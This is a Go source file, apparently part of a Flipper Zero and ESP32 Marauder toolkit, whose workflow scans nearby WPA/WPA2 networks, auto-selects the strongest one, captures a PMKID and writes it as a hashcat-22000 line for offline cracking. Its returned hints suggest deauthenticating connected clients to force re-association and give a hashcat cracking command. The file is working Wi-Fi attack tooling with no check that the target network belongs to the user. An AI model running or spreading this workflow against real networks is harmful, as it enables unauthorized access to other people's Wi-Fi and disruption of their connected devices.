package workflows

import (
	"context"
	"encoding/hex"
	"fmt"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// WiFiTargetToHashcat scans for nearby WPA/WPA2 APs, selects the
// strongest candidate (or a caller-supplied SSID), sniffs for a PMKID,
// and formats any capture into hashcat-22000 plaintext written to the
// Flipper SD card ready for offline cracking.
//
// Requires a connected Marauder devboard — returns a structured refusal
// if deps.Marauder is nil.
//
// Risk is High: active PMKID sniff plus a file write.
//
// Params:
//   - ssid (string, optional): target this SSID instead of
//     auto-picking the strongest AP.
//   - scan_seconds (int, default 10, clamped 3..60): AP scan window.
//   - sniff_seconds (int, default 45, clamped 10..300): PMKID sniff window.
//   - hashcat_path (string, default /ext/wifi/pmkid.22000): output path.
func WiFiTargetToHashcat(ctx context.Context, deps Deps, params map[string]interface{}) (string, error) {
	const wf = "wifi_target_to_hashcat"

	if deps.Marauder == nil {
		return encode(Result{
			Summary: "refused: Marauder devboard required for WiFi PMKID capture",
			NextSteps: []string{
				"Connect the ESP32 Marauder devboard and re-run with --wifi enabled",
				"This workflow depends on Marauder's sniffpmkid command; the Flipper alone cannot capture PMKIDs",
			},
		}), nil
	}

	scanSecs := clamp(paramInt(params, "scan_seconds", 10), 3, 60)
	sniffSecs := clamp(paramInt(params, "sniff_seconds", 45), 10, 300)
	targetSSID := strings.TrimSpace(paramString(params, "ssid"))
	outPath := paramString(params, "hashcat_path")
	if outPath == "" {
		outPath = "/ext/wifi/pmkid.22000"
	}

	var phases []PhaseResult
	extra := map[string]interface{}{
		"hashcat_path": outPath,
	}

	// --- 1. Scan ---
	if ctx.Err() != nil {
		return cancelledResult("wifi target to hashcat", phases, extra), nil
	}
	scanPhase := runPhase("scan", "wifi_scan_ap", func() (string, error) {
		return deps.Marauder.ScanAP(time.Duration(scanSecs) * time.Second)
	})
	phases = append(phases, scanPhase)
	recordPhase(deps.Audit, wf, scanPhase, map[string]int{"seconds": scanSecs}, "medium")

	if !scanPhase.OK {
		return encode(Result{
			Summary:   "wifi scan failed: " + firstLine(scanPhase.Output),
			Phases:    phases,
			NextSteps: []string{"Verify the Marauder cable, then retry — a fresh scan is harmless"},
			Extra:     extra,
		}), nil
	}

	// --- 2. List APs + pick target ---
	listPhase := runPhase("list_aps", "wifi_list_aps", func() (string, error) {
		return deps.Marauder.ListAPs()
	})
	phases = append(phases, listPhase)
	recordPhase(deps.Audit, wf, listPhase, nil, "low")

	aps := parseMarauderAPList(listPhase.Output)
	extra["aps_discovered"] = len(aps)

	var target *marauderAP
	if targetSSID != "" {
		for i := range aps {
			if strings.EqualFold(aps[i].SSID, targetSSID) {
				target = &aps[i]
				break
			}
		}
		if target == nil {
			return encode(Result{
				Summary:   fmt.Sprintf("SSID %q not in scan results (%d APs seen)", targetSSID, len(aps)),
				Phases:    phases,
				NextSteps: []string{"Re-run without the ssid param to auto-pick the strongest AP, or re-scan in range of the target"},
				Extra:     extra,
			}), nil
		}
	} else {
		target = pickStrongestWPA(aps)
		if target == nil {
			return encode(Result{
				Summary:   fmt.Sprintf("no WPA/WPA2 AP found in %d scan results", len(aps)),
				Phases:    phases,
				NextSteps: []string{"Move closer to a target WPA network or increase scan_seconds"},
				Extra:     extra,
			}), nil
		}
	}
	extra["target_ssid"] = target.SSID
	extra["target_bssid"] = target.BSSID
	extra["target_channel"] = target.Channel

	// --- 3. Select + sniff ---
	if ctx.Err() != nil {
		return cancelledResult("wifi target to hashcat", phases, extra), nil
	}
	selPhase := runPhase("select_ap", "wifi_select_ap", func() (string, error) {
		return deps.Marauder.SelectAP(strconv.Itoa(target.Index))
	})
	phases = append(phases, selPhase)
	recordPhase(deps.Audit, wf, selPhase, map[string]int{"index": target.Index}, "low")

	if ctx.Err() != nil {
		return cancelledResult("wifi target to hashcat", phases, extra), nil
	}
	sniffPhase := runPhase("sniff_pmkid", "wifi_sniff_pmkid", func() (string, error) {
		return deps.Marauder.SniffPMKID(0, false, false, time.Duration(sniffSecs)*time.Second)
	})
	phases = append(phases, sniffPhase)
	recordPhase(deps.Audit, wf, sniffPhase, map[string]int{"seconds": sniffSecs}, "high")

	pmkid := parsePMKID(sniffPhase.Output)
	if pmkid == nil {
		return encode(Result{
			Summary: fmt.Sprintf("no PMKID captured for %s in %ds", target.SSID, sniffSecs),
			Phases:  phases,
			NextSteps: []string{
				"Increase sniff_seconds (PMKID only fires on fresh associations)",
				"Deauth a connected client with workflow_wifi_deauth then retry to force re-association",
			},
			Extra: extra,
		}), nil
	}
	pmkid.SSID = target.SSID
	if pmkid.APMAC == "" {
		pmkid.APMAC = target.BSSID
	}

	hashcatLine := hashcat22000Line(*pmkid)
	extra["pmkid_hex"] = pmkid.PMKID
	extra["hashcat_22000"] = hashcatLine

	// --- 4. Persist to SD ---
	writePhase := runPhase("write_hashcat", "storage_write", func() (string, error) {
		if err := deps.Flipper.StorageWrite(outPath, hashcatLine+"\n"); err != nil {
			return err.Error(), err
		}
		return "wrote hashcat line to " + outPath, nil
	})
	phases = append(phases, writePhase)
	recordPhase(deps.Audit, wf, writePhase, map[string]string{"path": outPath}, "medium")

	summary := fmt.Sprintf("captured PMKID for %s (%s) — hashcat-22000 written to %s",
		target.SSID, target.BSSID, outPath)

	next := []string{
		fmt.Sprintf("Pull %s off the SD card and crack with `hashcat -m 22000 %s wordlist.txt`", outPath, outPath),
		"For stubborn WPA2, follow up with full 4-way handshake capture via airodump-ng",
	}

	return encode(Result{
		Summary:   summary,
		Phases:    phases,
		NextSteps: next,
		Extra:     extra,
	}), nil
}

// marauderAP is one row from Marauder's `list -a` output: an index the
// Marauder CLI uses for selection plus the parsed BSSID/SSID/channel/
// encryption fields.
type marauderAP struct {
	Index      int
	BSSID      string
	SSID       string
	Channel    int
	RSSI       int
	Encryption string
}

var (
	// Matches lines such as:
	//   "0: 00:11:22:33:44:55 MyAP ch:6 WPA2 RSSI:-55"
	//   "[0] SSID=MyAP BSSID=00:11:22:33:44:55 CH=6 ENC=WPA2 RSSI=-55"
	// The parser walks tokens rather than using one monster regex so
	// firmware variations don't silently misclassify.
	marauderAPIndexPattern = regexp.MustCompile(`^\s*[\[\(]?\s*(\d+)\s*[\]\)\.:]\s*(.*)$`)
	marauderBSSIDPattern   = regexp.MustCompile(`(?i)([0-9A-F]{2}(?::[0-9A-F]{2}){5})`)
	marauderChPattern      = regexp.MustCompile(`(?i)(?:ch[:=]?|channel[:=]?|CH[:=]?)\s*(\d+)`)
	marauderRSSIPattern    = regexp.MustCompile(`(?i)rssi[:=]?\s*(-?\d+)`)
	marauderEncPattern     = regexp.MustCompile(`(?i)(WPA3|WPA2|WPA|WEP|OPEN)`)
	marauderSSIDPattern    = regexp.MustCompile(`(?i)ssid[:=]\s*(\S+)`)
)

// parseMarauderAPList parses the free-form `list -a` output into rows.
// Firmware variants between Marauder releases print slightly different
// layouts; we extract the common fields (index/BSSID/SSID/channel)
// tolerantly and drop any row missing a BSSID.
func parseMarauderAPList(out string) []marauderAP {
	var aps []marauderAP
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		m := marauderAPIndexPattern.FindStringSubmatch(line)
		if m == nil {
			continue
		}
		idx, err := strconv.Atoi(m[1])
		if err != nil {
			continue
		}
		rest := m[2]
		bssidMatch := marauderBSSIDPattern.FindString(rest)
		if bssidMatch == "" {
			continue
		}
		ap := marauderAP{
			Index: idx,
			BSSID: strings.ToUpper(bssidMatch),
		}
		if mm := marauderChPattern.FindStringSubmatch(rest); len(mm) == 2 {
			ap.Channel, _ = strconv.Atoi(mm[1])
		}
		if mm := marauderRSSIPattern.FindStringSubmatch(rest); len(mm) == 2 {
			ap.RSSI, _ = strconv.Atoi(mm[1])
		}
		if mm := marauderEncPattern.FindStringSubmatch(rest); len(mm) == 2 {
			ap.Encryption = strings.ToUpper(mm[1])
		}
		if mm := marauderSSIDPattern.FindStringSubmatch(rest); len(mm) == 2 {
			ap.SSID = strings.TrimSpace(mm[1])
		} else {
			ap.SSID = extractSSIDTokens(rest, bssidMatch)
		}
		aps = append(aps, ap)
	}
	return aps
}

// extractSSIDTokens picks the most plausible SSID when the row isn't
// labelled `ssid=`. Strategy: take whatever non-metadata token sits
// between the BSSID and the channel/encryption/rssi fields.
func extractSSIDTokens(line, bssid string) string {
	afterBSSID := line
	if idx := strings.Index(line, bssid); idx >= 0 {
		afterBSSID = line[idx+len(bssid):]
	}
	// Trim trailing metadata fields.
	afterBSSID = marauderChPattern.ReplaceAllString(afterBSSID, "")
	afterBSSID = marauderRSSIPattern.ReplaceAllString(afterBSSID, "")
	afterBSSID = marauderEncPattern.ReplaceAllString(afterBSSID, "")
	fields := strings.Fields(afterBSSID)
	if len(fields) == 0 {
		return ""
	}
	return fields[0]
}

// pickStrongestWPA picks the WPA/WPA2 AP with the highest RSSI.
// Ignores OPEN/WEP (no PMKID possible) and WPA3 (SAE, different flow).
// Returns nil when no suitable candidate exists.
func pickStrongestWPA(aps []marauderAP) *marauderAP {
	var best *marauderAP
	for i := range aps {
		enc := aps[i].Encryption
		if enc != "WPA" && enc != "WPA2" {
			continue
		}
		if best == nil || aps[i].RSSI > best.RSSI {
			best = &aps[i]
		}
	}
	return best
}

// pmkidCapture is the minimum set of fields needed to construct a
// hashcat-22000 line from a Marauder sniffpmkid output.
type pmkidCapture struct {
	PMKID     string
	APMAC     string
	ClientMAC string
	SSID      string
}

var (
	pmkidHexPattern  = regexp.MustCompile(`(?i)PMKID[:\s]+([0-9A-F]{32})`)
	apMACPattern     = regexp.MustCompile(`(?i)(?:AP[:\s]+|BSSID[:\s]+|AP MAC[:\s]+)([0-9A-F]{2}(?::[0-9A-F]{2}){5})`)
	clientMACPattern = regexp.MustCompile(`(?i)(?:client[:\s]+|sta[:\s]+|station[:\s]+|client mac[:\s]+)([0-9A-F]{2}(?::[0-9A-F]{2}){5})`)
)

// parsePMKID extracts a PMKID capture from the Marauder sniffpmkid
// output. Returns nil when no PMKID hex appears.
func parsePMKID(out string) *pmkidCapture {
	m := pmkidHexPattern.FindStringSubmatch(out)
	if len(m) != 2 {
		return nil
	}
	cap := &pmkidCapture{
		PMKID: strings.ToLower(strings.TrimSpace(m[1])),
	}
	if mm := apMACPattern.FindStringSubmatch(out); len(mm) == 2 {
		cap.APMAC = strings.ToLower(strings.ReplaceAll(mm[1], ":", ""))
	}
	if mm := clientMACPattern.FindStringSubmatch(out); len(mm) == 2 {
		cap.ClientMAC = strings.ToLower(strings.ReplaceAll(mm[1], ":", ""))
	}
	return cap
}

// hashcat22000Line formats a PMKID capture into hashcat's mode-22000
// "PMKID*AP_MAC*CLIENT_MAC*ESSID_HEX" shape, wrapped with the required
// "WPA*01*" prefix and the three empty trailing fields. The returned
// string is a single line; the caller adds "\n" when persisting.
func hashcat22000Line(c pmkidCapture) string {
	ap := normalizeMAC(c.APMAC)
	client := normalizeMAC(c.ClientMAC)
	essid := hex.EncodeToString([]byte(c.SSID))
	return fmt.Sprintf("WPA*01*%s*%s*%s*%s***",
		c.PMKID, ap, client, essid)
}

// normalizeMAC strips separators and lowercases, returning "" for an
// empty input so the hashcat line's client-MAC field is left blank
// rather than mangled when we only have the AP side of the handshake.
func normalizeMAC(mac string) string {
	if mac == "" {
		return ""
	}
	mac = strings.ReplaceAll(mac, ":", "")
	mac = strings.ReplaceAll(mac, "-", "")
	return strings.ToLower(mac)
}
